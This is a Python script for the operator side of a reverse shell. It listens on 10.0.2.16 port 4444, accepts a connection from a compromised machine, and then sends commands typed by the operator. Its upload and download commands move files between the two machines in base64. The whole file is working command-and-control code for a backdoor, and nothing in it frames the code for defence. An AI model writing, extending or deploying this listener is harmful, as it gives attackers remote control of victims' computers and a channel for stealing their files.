import socket
import json
import shlex
import base64

class Listener:

    def __init__(self, ip, port) -> None:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # enable reusing socket
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))

        listener.listen(0)
        print("[+] waiting for incoming connections")
        self.conn, addr = listener.accept()
        print("[+] got a connection from " + str(addr))

    def exec_remotely(self, command):
        self.reliable_send(command) # send list using json encoding

        if command[0] == "exit":
            self.conn.close()
            exit()

        return self.reliable_receive()

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode())
    
    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.conn.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
        return "[+] download successful."

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def run(self):
        while True:
            command = input(">> ")
            # split string on spaces but preserve spaces enclosing
            # in quotes e.g. cd "Program Files"
            command = shlex.split(command)

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.exec_remotely(command)
                if command[0] == "download" and "[-] error" not in result:
                    result = self.write_file(command[1] ,result)
            except:
                result = "[-] error during command execution"

            print(result)

listener = Listener("10.0.2.16", 4444)
listener.run()